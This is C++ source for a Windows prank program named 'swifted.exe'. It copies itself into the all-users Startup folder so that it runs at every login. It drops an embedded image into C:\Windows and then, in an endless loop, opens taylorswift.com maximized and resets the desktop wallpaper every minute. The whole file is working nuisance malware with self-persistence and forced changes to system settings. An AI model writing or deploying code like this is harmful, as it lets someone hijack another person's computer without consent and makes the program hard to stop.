#include <Windows.h>

#include <Shellapi.h>
#include <Lmcons.h>
#include "resource.h"
#include <string>
#include <tchar.h>

#pragma comment (lib, "Shell32")
#pragma comment(lib, "user32.lib")

constexpr auto INTERVAL_MS = 60000;
constexpr auto URL = L"http://www.taylorswift.com";
constexpr auto STARTUP_PATH = L"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\swifted.exe";
constexpr auto MAX_CHAR_LENGTH = 4096;
std::wstring BG_FILE_NAME = L"c:\\Windows\\bg.bmp";

// Convert a char[] to LPCWSTR
wchar_t* ToLPCWSTR(const char * charArray)
{
	wchar_t * wString = new wchar_t[MAX_CHAR_LENGTH];

	MultiByteToWideChar(CP_ACP, 0, charArray, -1, wString, MAX_CHAR_LENGTH);

	return wString;
}

void Extract(WORD wResId, std::wstring lpszOutputPath)
{
	HINSTANCE hInstance = (HINSTANCE)GetModuleHandle(NULL);
	auto hrsrc = FindResource(hInstance, MAKEINTRESOURCE(wResId), _T("JPG"));
	auto hLoaded = LoadResource(NULL, hrsrc);
	auto lpLock = LockResource(hLoaded);
	auto dwSize = SizeofResource(NULL, hrsrc);

	auto hFile = CreateFile(lpszOutputPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD dwByteWritten;
	WriteFile(hFile, lpLock, dwSize, &dwByteWritten, NULL);
	CloseHandle(hFile);
	FreeResource(hLoaded);
}

// Make a copy of the program to the startup
void CopySelf() {
	char filename[MAX_PATH];

	GetModuleFileNameA(NULL, filename, MAX_PATH);

	CopyFile(ToLPCWSTR(filename), STARTUP_PATH, 0);
}

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ LPWSTR    lpCmdLine,
	_In_ int       nCmdShow)
{
	CopySelf();

	Extract(IDR_JPG1, BG_FILE_NAME);
	
	while (true) {
		ShellExecute(NULL, L"open", URL, NULL, NULL, SW_SHOWMAXIMIZED);

		SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (void*)BG_FILE_NAME.c_str(), SPIF_SENDCHANGE);
		
		Sleep(INTERVAL_MS);
	}
}